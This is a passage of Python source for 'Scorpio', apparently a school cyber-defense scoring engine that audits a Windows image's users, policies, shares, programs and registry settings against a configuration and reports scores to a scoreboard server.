        uploadStatus = "<span style=\"color:gray\">Disconnected: Scorpio Offline Mode</span>"

    print("Scoring has begun. Leave this window open.")


def sendScore(totalpoints, elapsedtime):
    global uploadStatus
    global DEBUG
    elapsedtime = [x for x in elapsedtime.split(":")][:2]
    if elapsedtime[0][0] == '0' and len(elapsedtime[0]) == 2:
        elapsedtime[0] = elapsedtime[0][1]
    body = {"name": NAME, "imageName": IMAGE_NAME, "score": totalpoints, "totalTime": ":".join(elapsedtime)}
    headers = {'content-type': 'application/json'}
    try:
        r = requests.post(env.SCORING_SERVER + "/addScore", data=json.dumps(body), headers=headers)
        if r.status_code != 200:
            uploadStatus = "<span style=\"color:red\">FAILED - Reason: Could not connect to server</span>"
        else:
            uploadStatus = "<span style=\"color:green\">OK</span>"
    except requests.exceptions.ConnectionError:
        uploadStatus = "<span style=\"color:red\">FAILED - Reason: Could not connect to server</span>"
    except Exception as e:
        if DEBUG:
            print("Error in sending score: " + str(e))


def serversetup():
    global STARTTIME
    global UPDATETIME
    global TOTALTIME
    global warning
    global uploadStatus
    try:
        req = requests.get(env.SCORING_SERVER + "/getScores?name=" + quote(NAME) + "&imageName=" + IMAGE_NAME)
        if req.content == b'[]':
            sendScore(0, "0:00:00")
        else:
            STARTTIME = datetime.strptime(ast.literal_eval(req.content.decode("utf-8"))[0]["startTime"],
                                          '%Y-%m-%dT%H:%M:%S.%fZ')
            UPDATETIME = datetime.strptime(ast.literal_eval(req.content.decode("utf-8"))[0]["updateTime"],
                                           '%Y-%m-%dT%H:%M:%S.%fZ')
            TOTALTIME = UPDATETIME - STARTTIME
        if [int(float(x)) for x in str(TOTALTIME).split(":")] > [6, 0, 0]:
            print("Warning: time period exceeded")
            warning = """<h3 class="center"><span style="color:red">Warning: time period exceeded</span></h3>"""
        elif [int(float(x)) for x in str(TOTALTIME).split(":")] > [5, 0, 0]:
            print("Warning: time period near limit")
            warning = """<h3 class="center"><span style="color:yellow">Warning: time period near limit</span></h3>"""
    except requests.exceptions.ConnectionError:
        uploadStatus = "<span style=\"color:red\">FAILED - Reason: Could not connect to server</span>"
    except Exception as e:
        print("Error in communicating with scoreboard - is something blocking the connection?")
        if DEBUG:
            print(e)

    # TODO: during score send, server server will evaluate difference and return in format H+:MM:SS, rather than client


def runScoring():
    global lastPoints
    global UPDATETIME
    global TOTALTIME
    global warning
    global IMAGE_NAME
    global BACKDOOR
    global uploadStatus
    vulnLines = []
    penalLines = []
    totalPoints = 0
    gainPoints = 0
    losePoints = 0
    currentVulns = 0
    currentPenal = 0
    for vuln in vulns:
        foo = vuln.check()
        if DEBUG and int(foo[0]) == 0:
            print("Vuln #" + str(vulns.index(vuln) + 1) + " missing: " + foo[2] + "\n")
        if int(foo[0]) == 1 and int(foo[1]) > 0:
            totalPoints += int(foo[1])
            gainPoints += int(foo[1])
            currentVulns += 1
            vulnLines.append(str(foo[2]) + " - " + str(foo[1]) + " pts" + ("<br>" if IS_GUI else "") + "\n")
        if DEBUG and int(foo[0]) == 2:
            print("WARNING: error from vuln #" + str(vulns.index(vuln) + 1) + " - " + foo[2] + "\n")
    for penal in penals:
        bar = penal.check()
        if int(bar[0]) == 0:
            totalPoints -= -1*int(bar[1])
            losePoints += -1*int(bar[1])
            currentPenal += 1
            penalLines.append(str(bar[2]) + " - " + str(-1*int(bar[1])) + " pts" + ("<br>" if IS_GUI else "") + "\n")
    if not BACKDOOR:
        try:
            if IS_ONLINE:
                req = requests.get(env.SCORING_SERVER + "/getScores?name=" + quote(NAME) + "&imageName=" + IMAGE_NAME)
                UPDATETIME = datetime.strptime(ast.literal_eval(req.content.decode("utf-8"))[0]["updateTime"],
                                               '%Y-%m-%dT%H:%M:%S.%fZ')
            else:
                UPDATETIME = datetime.utcnow()
            TOTALTIME = UPDATETIME - STARTTIME
            if [int(float(x)) for x in str(TOTALTIME).split(":")] > [6, 0, 0]:
                warning = """<h3 class="center"><span style="color:red">Warning: time period exceeded</span></h3>"""
            elif [int(float(x)) for x in str(TOTALTIME).split(":")] > [5, 0, 0]:
                warning = """<h3 class="center"><span style="color:yellow">Warning: time period near limit</span></h3>"""
        except requests.exceptions.ConnectionError:
            uploadStatus = "<span style=\"color:red\">FAILED - Reason: Could not connect to server</span>"
        except Exception as e:
            if DEBUG:
                print("Error in sending score: " + str(e))
    writeScores(IMAGE_NAME, vulnLines, penalLines, totalPoints, gainPoints, losePoints, currentVulns, currentPenal,
                len(vulns), strftime("%Y-%m-%d %H:%M:%S"), TOTALTIME)
    try:
        if totalPoints > lastPoints and IS_GUI:
            toaster = ToastNotifier()
            toaster.show_toast("Scorpio", "You Gained Points", icon_path="C:/Windows/Scorpio/scorpio.ico", duration=5,
                               threaded=True)
            winsound.PlaySound("C:/" + SCORING_FOLDER + "/gain.wav", winsound.SND_FILENAME)
        elif totalPoints < lastPoints and IS_GUI:
            toaster = ToastNotifier()
            toaster.show_toast("Scorpio", "You Lost Points", icon_path="C:/Windows/Scorpio/scorpio.ico", duration=5,
                               threaded=True)
            winsound.PlaySound("C:/" + SCORING_FOLDER + "/alarm.wav", winsound.SND_FILENAME)
    except:
        if DEBUG:
            print("audio error")
    if DEBUG:
        print()
    lastPoints = totalPoints


def writeScores(imageName, vulnLines, penalLines, totalPoints, gainPoints, losePoints, currentVulns, currentPenal,
                totalVulns, currentTime, timeElapsed):
    global NAME
    global BACKDOOR
    if not BACKDOOR and IS_ONLINE:
        sendScore(totalPoints, formatTime(timeElapsed))
    with open(f"C:/{SCORING_FOLDER}/Scoring Report." + ("html" if IS_GUI else "txt"), 'w') as output_file:
        for line in html_str.splitlines():
            if line.strip() == '{{+LIST}}':
                for vulnLine in vulnLines:
                    output_file.write(("" if IS_GUI else "\t") + vulnLine)
            elif line.strip() == '{{-LIST}}':
                for penalLine in penalLines:
                    output_file.write(("" if IS_GUI else "\t") + penalLine)
            else:
                newLine = line
                newLine = newLine.replace("{{IMAGENAME}}", imageName)
                newLine = newLine.replace("{{WARNING}}", warning)
                newLine = newLine.replace("{{SCORPIOSTATUS}}", scorpioStatus)
                newLine = newLine.replace("{{UPLOADSTATUS}}", uploadStatus)
                newLine = newLine.replace("{{POINTS}}", str(totalPoints))
                newLine = newLine.replace("{{MAXPOINTS}}", str(maxPoints))
                newLine = newLine.replace("{{+POINTS}}", str(gainPoints))
                newLine = newLine.replace("{{-POINTS}}", str(losePoints))
                newLine = newLine.replace("{{+CURRENT}}", str(currentVulns))
                newLine = newLine.replace("{{-CURRENT}}", str(currentPenal))
                newLine = newLine.replace("{{VULNS}}", str(totalVulns))
                newLine = newLine.replace("{{TIME}}", currentTime)
                newLine = newLine.replace("{{RUNTIME}}", formatTime(timeElapsed))
                newLine = newLine.replace("{{NAME}}", NAME)
                output_file.write(newLine + ("" if IS_GUI else "\n"))


def formatTime(time):
    seconds = time.total_seconds()
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    seconds = int(seconds % 60)
    if hours < 10:
        hours = "0" + str(hours)
    if minutes < 10:
        minutes = "0" + str(minutes)
    if seconds < 10:
        seconds = "0" + str(seconds)
    return str(hours) + ":" + str(minutes) + ":" + str(seconds)



# GATHER INFO SECTION------------------------------------------------------------------------------------------------ #

def getUsers():
    global DEBUG
    try:
        level = 3
        resume = 0
        while True:
            localUserList, total, resume = win32net.NetUserEnum(None, level, 0, resume, 999999)
            for userProfile in localUserList:
                userList.append(userProfile)
                usernameList.append(userProfile['name'])
            if resume == 0:
                break
    except pywintypes.error as e:
        if DEBUG:
            print(e)


def exportPolicies():
    global DEBUG
    try:
        subprocess.check_output("SecEdit.exe /export /cfg \"C:\\" + SCORING_FOLDER + "\\securityExport.inf\"")
    except Exception as e:
        print("Error in checking security - did you run as Administrator?")
        if DEBUG:
            print(e)


def getShares():
    global DEBUG
    try:
        level = 2
        resume = 0
        while True:
            shares, total, resume = win32net.NetShareEnum(None, level, resume, 999999)
            for share in shares:
                activeShares.append(share['netname'])
                activeShares.append(share['path'])
            if resume == 0:
                break
    except pywintypes.error as e:
        print("Error in checking security - is the Server service enabled?")
        if DEBUG:
            print(e)


def getPrograms():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall', 0,
                         (REGVIEW + winreg.KEY_READ))
    for i in range(winreg.QueryInfoKey(key)[0]):
        name = winreg.EnumKey(key, i)
        try:
            subkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + name, 0,
                                    (REGVIEW + winreg.KEY_READ))
            displayName = winreg.QueryValueEx(subkey, "DisplayName")[0]
            installedPrograms.append(displayName)
        except:
            pass


# Function to run all information helpers
def runInfo():
    getUsers()
    getPrograms()
    exportPolicies()
    getShares()


# END OF GATHER INFO SECTION------------------------------------------------------------------------------------------ #


'''DEFINE YOUR VULNS BELOW-------------------------------------------------------------------------------------------'''

conflist, USER, IMAGE_NAME = extractconf(SCORING_FOLDER)

def str2bool(arg):
    return arg.lower() in ("true", "1")

for forens in conflist["forensics"]:
    if int(forens["points"]) >= 0:
        vulns.append(Forensics([forens["filepath"], forens["answer"]], [forens["points"], forens["description"]]))
    else:
        penals.append(Forensics([forens["filepath"], forens["answer"]], [forens["points"], forens["description"]]))

for users in conflist["users"]:
    if users["option"] == "authorized":
        if int(users["points"]) >= 0:
            vulns.append(User([users["username"], str2bool(users["argument"])],
                              [users["points"], users["description"]]))
        else:
            penals.append(User([users["username"], str2bool(users["argument"])],
                               [users["points"], users["description"]]))
    elif users["option"] == "pwexp":
        if int(users["points"]) >= 0:
            vulns.append(User([users["username"], users["option"]],
                          [users["points"], users["description"]]))
        else:
            penals.append(User([users["username"], users["option"]],
                              [users["points"], users["description"]]))
    elif users["option"] in ["passwd", "chname", "!chname"]:
        if int(users["points"]) >= 0:
            vulns.append(User([users["username"], users["option"], users["argument"]],
                          [users["points"], users["description"]]))
        else:
            penals.append(User([users["username"], users["option"], users["argument"]],
                              [users["points"], users["description"]]))
    else:
        print("Invalid options/arguments for users vulns")

for groups in conflist["groups"]:
    if int(groups["points"]) >= 0:
        vulns.append(User([groups["username"], groups["groupName"], str2bool(groups["shouldBeMember"])], [groups["points"], groups["description"]]))
    else:
        penals.append(User([groups["username"], groups["groupName"], str2bool(groups["shouldBeMember"])],
                          [groups["points"], groups["description"]]))

for pols in conflist["localpolicy"]:
    try:
        expectedValue = int(pols["expectedValue"])
        if int(pols["points"]) >= 0:
            vulns.append(Policy([pols["policyName"], pols["condition"], expectedValue], [pols["points"], pols["description"]]))
        else:
            penals.append(Policy([pols["policyName"], pols["condition"], expectedValue],
                                [pols["points"], pols["description"]]))
    except:
        if int(pols["points"]) >= 0:
            vulns.append(Policy([pols["policyName"], pols["condition"], pols["expectedValue"]], [pols["points"], pols["description"]]))
        else:
            penals.append(Policy([pols["policyName"], pols["condition"], pols["expectedValue"]],
                                [pols["points"], pols["description"]]))

for comms in conflist["commands"]:
    if int(comms["points"]) >= 0:
        vulns.append(Command([comms["command"], comms["splitPosition"], comms["comparisonValue"], str2bool(comms["matchOrNot"])], [comms["points"], comms["description"]]))
    else:
        penals.append(
            Command([comms["command"], comms["splitPosition"], comms["comparisonValue"], str2bool(comms["matchOrNot"])],
                    [comms["points"], comms["description"]]))

for featservs in conflist["featuresAndServices"]:
    if int(featservs["points"]) >= 0:
        vulns.append(ServFeat([featservs["servOrFeat"], featservs["itemName"], str2bool(featservs["authorized"])], [featservs["points"], featservs["description"]]))
    else:
        penals.append(ServFeat([featservs["servOrFeat"], featservs["itemName"], str2bool(featservs["authorized"])],
                              [featservs["points"], featservs["description"]]))

for shares in conflist["shares"]:
    if int(shares["points"]) >= 0:
        vulns.append(Share([shares["shareName"], shares["sharePath"], str2bool(shares["authorized"]), False], [shares["points"], shares["description"]]))
    else:
        penals.append(Share([shares["shareName"], shares["sharePath"], str2bool(shares["authorized"]), False],
                           [shares["points"], shares["description"]]))

for files in conflist["files"]:
    if int(files["points"]) >= 0:
        vulns.append(File([files["filePath"], str2bool(files["authorized"])], [files["points"], files["description"]]))
    else:
        penals.append(
            File([files["filePath"], str2bool(files["authorized"])], [files["points"], files["description"]]))

for apps in conflist["programs"]:
    if int(apps["points"]) >= 0:
        vulns.append(Program([apps["programName"], apps["programPath"], str2bool(apps["authorized"])], [apps["points"], apps["description"]]))
    else:
        penals.append(Program([apps["programName"], apps["programPath"], str2bool(apps["authorized"])],
                             [apps["points"], apps["description"]]))

for regs in conflist["registry"]:
    try:
        expectedValue = int(regs["expectedValue"])
        if int(regs["points"]) >= 0:
            vulns.append(Reg([regs["hKey"], regs["path"], regs["key"], regs["checkingIndex"], regs["condition"], expectedValue], [regs["points"], regs["description"]]))
        else:
            penals.append(
                Reg([regs["hKey"], regs["path"], regs["key"], regs["checkingIndex"], regs["condition"], expectedValue],
                    [regs["points"], regs["description"]]))
    except:
        if int(regs["points"]) >= 0:
            vulns.append(Reg([regs["hKey"], regs["path"], regs["key"], regs["checkingIndex"], regs["condition"], regs["expectedValue"]], [regs["points"], regs["description"]]))
        else:
            penals.append(Reg([regs["hKey"], regs["path"], regs["key"], regs["checkingIndex"], regs["condition"],
                              regs["expectedValue"]], [regs["points"], regs["description"]]))


'''END OF VULNS------------------------------------------------------------------------------------------------------'''

# MAIN SEQUENCE
print(IMAGE_NAME + " provided by Troy High School Cyber Defense.\nUnauthorized access to this image is not "
                   "tolerated.\nScorpio developed by Clement Chan and Jimmy Li")

getMax()
# for vuln in vulns:
#     print(vuln.comment + " - " + str(vuln.points) + " pts")
# print()
# print("Total vulns: " + str(len(vulns)))
# print("Total points: " + str(maxPoints))
# exit()
if not END_TIME or strftime("%y %m %d %H %M %S").split() < END_TIME or BACKDOOR:
    initialize()
    while not END_TIME or strftime("%y %m %d %H %M %S").split() < END_TIME or BACKDOOR:
        runInfo()
        runScoring()
        # Clear Lists
        userList.clear()
        usernameList.clear()
        installedPrograms.clear()
        activeShares.clear()
        if BACKDOOR:
            wait = input("Press Enter to check...")
        else:
            sleep(REFRESH_RATE)
    scorpioStatus = "<span style=\"color:red\">DOWN - Reason: Time period exceeded</span>"
    runInfo()
    runScoring()
print("Scorpio Scoring Engine is shut down")
exit()
